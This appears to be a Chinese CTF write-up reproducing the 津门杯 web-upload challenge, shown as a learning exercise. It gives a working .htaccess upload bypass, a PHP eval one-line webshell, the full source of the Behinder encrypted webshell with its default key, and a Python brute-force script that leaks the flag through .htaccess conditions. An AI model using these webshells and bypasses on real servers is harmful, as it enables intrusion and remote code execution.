# 记一次对津门杯web-upload的详解

阅读量 **200816**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-25 17:30:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t019ec11a75f3a789aa.jpg)

## 前言：

最近在学习一些ctf的东西，所以自己想从一个小白的身份，复现一些web的漏洞。学习一些大佬的思路！  
一、文件上传漏洞常规思路  
1.首先这个是一道文件上传题，常规思路就是上传png、gif等进行bp抓包进行绕过限制  
这里普及一下文件上传漏洞的知识。  
文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。  
常见web上传漏洞的解题手法大致分为白名单和黑名单  
常用工具：冰蝎、蚁剑、中国菜刀等等+php一句话木马。  
文件上传靶机推荐：<https://github.com/c0ny1/upload-labs>

![](https://p4.ssl.qhimg.com/t01f6a440a1492cd5b6.png)

## 二．津门杯文件上传wp

1.现在回到我们的题，我先使用php写入一句话木马，然后改为png格式，进行上传。

![](https://p4.ssl.qhimg.com/t01ba5ccdade5d2961c.png)

2.发现可以上传，但是没有解析。

![](https://p2.ssl.qhimg.com/t0129985baf14b10be1.png)

3.然后看看响应包，直接302了。说明注入和常规文件上传思路都没戏的！

![](https://p3.ssl.qhimg.com/t01d0cd92b050e92293.png)

4.然后从源码出发，看了看源码发现不能注入，也不能绕过上传。

![](https://p2.ssl.qhimg.com/t01a9639423ab3a56b5.png)

5.然后看到了这个php规则。经过百度之后发现先知一位大佬写了：<https://xz.aliyun.com/t/8267>

<Directory ~ “/var/www/html/upload/[a-f0-9]{32}/”> php_flag engine
off</Directory>

![](https://p3.ssl.qhimg.com/t0172f4f49c7a375446.png)

## 三、解题思路（1）

1.开始构造文件上传文件

![](https://p3.ssl.qhimg.com/t0132cb60f34bf5b6d9.png)

2.新建.htaccess文件

第一个文件叫.htaccess  
内容是:

<FilesMatch “1.png”>  
SetHandler application/x-httpd-php  
php_flag engine on  
</FilesMatch>

3.新建1.png，进行文件上传

第二个文件名叫1.png  
<?php eval($_GET[‘cmd’]);?>

![](https://p1.ssl.qhimg.com/t01ba2a980b5d7d3e8e.png)

4.先上传.htaccess文件，然后再上传.png文件，上传的png文件就会被解析了。

![](https://p0.ssl.qhimg.com/t01fa46527c5cf9f3d8.png)

5.上传.htaccess文件

![](https://p5.ssl.qhimg.com/t01c8576529b2191e68.png)

6.上传png文件

![](https://p3.ssl.qhimg.com/t0175f6a49716187c92.png)

7.然后找到上传图片的路径  
<img src=”upload/e8be345643e019844763188240c38377/1.png”>

8.读文件  
<http://122.112.248.222:20003/upload/e6a96d9444d3a938319f35616e5d1add/1.png>  
成功上传，解析

![](https://p0.ssl.qhimg.com/t0160881ab75b83d657.png)

9.读phpinfo

/upload/e6a96d9444d3a938319f35616e5d1add/1.png?cmd=phpinfo();

![](https://p0.ssl.qhimg.com/t010bb103b2358c23f6.png)

10.扫目录  
/upload/e6a96d9444d3a938319f35616e5d1add/1.png?cmd=var_dump(scandir(%22/%22));

![](https://p3.ssl.qhimg.com/t01c2fbc0529682f30f.png)

/upload/e6a96d9444d3a938319f35616e5d1add/1.png?cmd=readfile(%22/flag%22);

![](https://p5.ssl.qhimg.com/t01cc055be2d331a663.png)

## 方法2:

冰蝎：地址：<https://github.com/rebeyond/Behinder>  
首先访问站点

![](https://p2.ssl.qhimg.com/t01a498f7d1ecb5c18c.png)

真nm嚣张，干你走起

因为配置文件中使用<directory>禁止了upload沙盒解析，所以需要上传.htaccess，随便选择一个文件，通过Burp抓包修改参数如下

![](https://p3.ssl.qhimg.com/t01be630283083c8d41.png)

解释一下，将文件名和文件内容修改为.htaccess还不够，还需要将.htaccess放至站点目录之下

![](https://p4.ssl.qhimg.com/t0137c3af364459368b.png)

之后上传冰蝎马（当然期间还上传了一句话和大马）

![](https://p5.ssl.qhimg.com/t01ebad0fe0747e2908.png)

直接连你，密码为rebeyond，成功getshell

在根目录下找到flag，flag为 flag{BNjmiWsBgTW4fsLoDgWLvgnfqk1CI3Nx}

![](https://p1.ssl.qhimg.com/t011523dc70be83273f.png)

冰蝎马如下

    
    
    <?php
    @errorreporting(0);
    session_start();
    $key = ”e45e329feb5d925b”; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION[‘k’] = $key;
    session_write_close();
    $post = file_get_contents(“php: //input”);
        if (!extension_loaded(‘openssl’)) {
            $t = ”base64“ . ”decode”;
            $post = $t($post . ””);
            for ($i = 0;$i < strlen($post);$i++) {
                $post[$i] = $post[$i] ^ $key[$i + 1 & 15];
            }
        } else {
            $post = openssl_decrypt($post, "AES128", $key);
        }
        $arr = explode('|', $post);
        $func = $arr[0];
        $params = $arr[1];
        class C {
            public function __invoke($p) {
                eval($p . "");
            }
        }
        @call_user_func(new C(), $params);
    ?>

## 方法3：NulL大佬的脚本

<If “file(‘/flag’)=~ /”’flag{xxxx”’/”>  
ErrorDocument 404 “wupco”  
</If>

原理：匹配不到就返回404且有wupco这个字符串，直接脚本逐位爆破

    
    
    import requests
    import string
    import hashlib
    ip = requests.get('http://118.24.185.108/ip.php').text
    print(ip)
    def check(a):
        htaccess = '''
        <If "file('/flag')=~ /'''+a+'''/">
        ErrorDocument 404 "wupco"
        </If>
        '''
        resp = requests.post("http://122.112.248.222:20003/index.php?id=69660",data={'submit': 'submit'}, files={'file': ('.htaccess',htaccess)} )
        a = requests.get("http://122.112.248.222:20003/upload/"+ip+"/a").text
        if "wupco" not in a:
            return False
        else:
            return True
    flag = "flag{BN"
    c = string.ascii_letters + string.digits + "\{\}"
    for j in range(32):
        for i in c:
            print("checking: "+ flag+i)
            if check(flag+i):
                flag = flag+i
                print(flag)
                break
            else:
                continue

总结：复现过程中遇到了一些自己从来没有遇到的问题。也碰到了很多没有接触过的知识，感谢在复现过程中提供思路的朋友。感觉到自己技术还有很多不足的地方，希望会的大佬跳过，大佬勿喷！我就是菜弟弟。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Arthur** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241059](/post/id/241059)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __7赞

 __收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg) Arthur

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

